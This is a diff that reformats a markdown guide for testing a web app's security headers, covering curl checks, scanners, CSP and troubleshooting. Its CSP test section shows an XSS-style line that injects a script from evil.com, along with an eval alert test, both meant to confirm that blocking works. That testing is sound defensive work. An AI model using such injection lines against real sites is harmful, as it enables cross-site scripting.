@@ -25,7 +25,7 @@ BASE_URL=https://your-production-domain.com ./scripts/test-security-headers.sh
 # Test main application security headers
 curl -I http://localhost:3000
 
-# Test API endpoint security headers  
+# Test API endpoint security headers
 curl -I http://localhost:3000/api/security/headers-test
 
 # Test rate limiting headers
@@ -36,24 +36,24 @@ curl -I http://localhost:3000/api/test-rate-limit
 
 ### ✅ Implemented Headers
 
-| Header | Purpose | Expected Value |
-|--------|---------|----------------|
-| `X-Frame-Options` | Prevent clickjacking | `DENY` |
-| `X-Content-Type-Options` | Prevent MIME sniffing | `nosniff` |
-| `X-XSS-Protection` | Legacy XSS protection | `1; mode=block` |
-| `Referrer-Policy` | Control referrer information | `strict-origin-when-cross-origin` |
-| `Permissions-Policy` | Control browser features | `camera=(), microphone=(), geolocation=(self)...` |
-| `Content-Security-Policy` | Prevent XSS and data injection | Custom policy for Square, Supabase, etc. |
-| `Strict-Transport-Security` | Enforce HTTPS | `max-age=63072000; includeSubDomains; preload` |
+| Header                      | Purpose                        | Expected Value                                    |
+| --------------------------- | ------------------------------ | ------------------------------------------------- |
+| `X-Frame-Options`           | Prevent clickjacking           | `DENY`                                            |
+| `X-Content-Type-Options`    | Prevent MIME sniffing          | `nosniff`                                         |
+| `X-XSS-Protection`          | Legacy XSS protection          | `1; mode=block`                                   |
+| `Referrer-Policy`           | Control referrer information   | `strict-origin-when-cross-origin`                 |
+| `Permissions-Policy`        | Control browser features       | `camera=(), microphone=(), geolocation=(self)...` |
+| `Content-Security-Policy`   | Prevent XSS and data injection | Custom policy for Square, Supabase, etc.          |
+| `Strict-Transport-Security` | Enforce HTTPS                  | `max-age=63072000; includeSubDomains; preload`    |
 
 ### 🔍 Additional Security Headers
 
-| Header | Purpose | Expected Value |
-|--------|---------|----------------|
-| `X-DNS-Prefetch-Control` | Control DNS prefetching | `off` |
-| `X-Download-Options` | IE download options | `noopen` |
-| `X-Permitted-Cross-Domain-Policies` | Adobe Flash/PDF policies | `none` |
-| `X-Request-ID` | Request tracing | `req_[timestamp]_[random]` |
+| Header                              | Purpose                  | Expected Value             |
+| ----------------------------------- | ------------------------ | -------------------------- |
+| `X-DNS-Prefetch-Control`            | Control DNS prefetching  | `off`                      |
+| `X-Download-Options`                | IE download options      | `noopen`                   |
+| `X-Permitted-Cross-Domain-Policies` | Adobe Flash/PDF policies | `none`                     |
+| `X-Request-ID`                      | Request tracing          | `req_[timestamp]_[random]` |
 
 ## 🧪 Testing Methods
 
@@ -67,6 +67,7 @@ curl -I http://localhost:3000/api/test-rate-limit
 6. Check the Response Headers section
 
 **Expected Headers in Browser:**
+
 - All security headers should be present
 - CSP violations should appear in Console if any
 - No server information leakage
@@ -74,6 +75,7 @@ curl -I http://localhost:3000/api/test-rate-limit
 ### Method 2: Online Security Scanners
 
 #### SecurityHeaders.com
+
 ```bash
 # Visit: https://securityheaders.com/
 # Enter your domain: https://your-domain.com
@@ -81,20 +83,23 @@ curl -I http://localhost:3000/api/test-rate-limit
 ```
 
 #### Mozilla Observatory
+
 ```bash
 # Visit: https://observatory.mozilla.org/
-# Enter your domain: https://your-domain.com  
+# Enter your domain: https://your-domain.com
 # Expected Grade: A or A+
 ```
 
 ### Method 3: Command Line Testing
 
 #### Basic Header Check
+
 ```bash
 curl -I https://your-domain.com | grep -i "x-frame-options\|x-content-type-options\|content-security-policy"
 ```
 
 #### Comprehensive Header Test
+
 ```bash
 # Test all security headers at once
 curl -s -I https://your-domain.com | grep -E "^(X-Frame-Options|X-Content-Type-Options|X-XSS-Protection|Referrer-Policy|Permissions-Policy|Content-Security-Policy|Strict-Transport-Security):"
@@ -103,11 +108,13 @@ curl -s -I https://your-domain.com | grep -E "^(X-Frame-Options|X-Content-Type-O
 ### Method 4: CSP Testing
 
 #### Manual CSP Test
+
 1. Open browser console on your site
 2. Try to execute: `eval('alert("XSS test")')`
 3. Should be blocked by CSP with console error
 
 #### CSP Violation Testing
+
 ```javascript
 // Try in browser console - should be blocked
 document.body.innerHTML += '<script src="https://evil.com/malicious.js"></script>';
@@ -126,6 +133,7 @@ BASE_URL=http://localhost:3000 ./scripts/test-security-headers.sh
 ```
 
 **Expected Results:**
+
 - All security headers present
 - CSP allows development tools
 - Rate limiting functional
@@ -139,6 +147,7 @@ BASE_URL=https://your-production-domain.com ./scripts/test-security-headers.sh
 ```
 
 **Expected Results:**
+
 - All security headers present
 - Strict CSP enforcement
 - HSTS enabled
@@ -155,7 +164,7 @@ Test that required external domains are allowed:
 # Test Square payment integration
 curl -s "https://your-domain.com" | grep -o "https://js.squareup.com"
 
-# Test Supabase integration  
+# Test Supabase integration
 curl -s "https://your-domain.com" | grep -o "https://.*\.supabase\.co"
 
 # Test Google Maps/Fonts
@@ -180,10 +189,12 @@ done
 #### 1. CSP Blocking Required Resources
 
 **Symptoms:**
+
 - Console errors about blocked resources
 - Functionality not working (payments, maps, etc.)
 
 **Solutions:**
+
 - Check `src/lib/security/csp-config.ts`
 - Add missing domains to `TRUSTED_DOMAINS`
 - Update CSP in `next.config.js`
@@ -191,9 +202,11 @@ done
 #### 2. Headers Not Appearing
 
 **Symptoms:**
+
 - Security headers missing in browser/curl
 
 **Check:**
+
 1. Next.js config: `next.config.js` headers section
 2. Middleware: `src/middleware.ts` addSecurityHeaders function
 3. Vercel config: `vercel.json` headers section
@@ -201,10 +214,12 @@ done
 #### 3. Rate Limiting Not Working
 
 **Symptoms:**
+
 - No rate limit headers
 - Rate limiting not enforced
 
 **Check:**
+
 1. Rate limiting service: `src/lib/rate-limit.ts`
 2. Middleware integration: `src/middleware.ts`
 3. Environment variables: Redis connection
@@ -235,13 +250,13 @@ console.log(validateCSPConfig());
 
 ### Security Improvement
 
-| Attack Vector | Protection Level | Implementation |
-|---------------|------------------|----------------|
-| XSS | High | CSP + XSS Protection |
-| Clickjacking | High | X-Frame-Options |
-| MIME Sniffing | High | X-Content-Type-Options |
-| Information Disclosure | Medium | Hidden server headers |
-| HTTPS Downgrade | High | HSTS |
+| Attack Vector          | Protection Level | Implementation         |
+| ---------------------- | ---------------- | ---------------------- |
+| XSS                    | High             | CSP + XSS Protection   |
+| Clickjacking           | High             | X-Frame-Options        |
+| MIME Sniffing          | High             | X-Content-Type-Options |
+| Information Disclosure | Medium           | Hidden server headers  |
+| HTTPS Downgrade        | High             | HSTS                   |
 
 ## 🎯 Next Steps
 
@@ -285,4 +300,4 @@ After successful testing:
 
 **Last Updated**: January 2025  
 **Version**: 1.0.0  
-**Maintainer**: Development Team 
+**Maintainer**: Development Team
